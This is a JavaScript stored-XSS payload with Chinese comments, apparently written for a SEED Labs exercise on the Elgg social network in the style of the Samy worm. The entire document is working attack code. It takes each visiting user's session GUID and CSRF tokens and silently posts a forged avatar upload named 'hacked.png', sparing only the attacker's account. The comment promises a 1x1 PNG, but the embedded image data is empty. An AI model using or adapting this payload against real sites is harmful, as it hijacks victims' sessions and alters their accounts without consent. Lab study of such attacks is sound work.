<script type="text/javascript">
window.onload = function() {
	var samyGuid = 59;
    
	// 免疫機制：Samy 拜訪自己的頁面時不會觸發
	if (elgg.session.user.guid != samyGuid) {
   	 
    	// 1. 準備一張極小的圖片 (Base64格式)
    	// 這裡是一張 1x1 的紅色 PNG 圖片，你可以自己去網路上找圖片轉 Base64 替換這串字
    	var b64Data = "";
   	 
    	// 2. 將 Base64 字串還原成二進位的 Blob 物件 (模擬真實的圖片檔案)
    	var byteCharacters = atob(b64Data);
    	var byteNumbers = new Array(byteCharacters.length);
    	for (var i = 0; i < byteCharacters.length; i++) {
        	byteNumbers[i] = byteCharacters.charCodeAt(i);
    	}
    	var byteArray = new Uint8Array(byteNumbers);
    	var blob = new Blob([byteArray], {type: 'image/png'});

    	// 3. 建立 FormData 物件，模擬表單上傳
    	var formData = new FormData();
    	formData.append('__elgg_token', elgg.security.token.__elgg_token);
    	formData.append('__elgg_ts', elgg.security.token.__elgg_ts);
    	formData.append('guid', elgg.session.user.guid);
   	 
    	// 將 Blob 塞進表單中，'avatar' 是 Elgg 預設接收圖片的欄位名稱，'hacked.png' 是假造的檔名
    	formData.append('avatar', blob, 'hacked.png');

    	// 4. 發送 POST 請求
    	var sendurl = "http://www.seed-server.com/action/avatar/upload";
    	var Ajax = new XMLHttpRequest();
    	Ajax.open("POST", sendurl, true);
   	
    	Ajax.send(formData);
	}
}
</script>
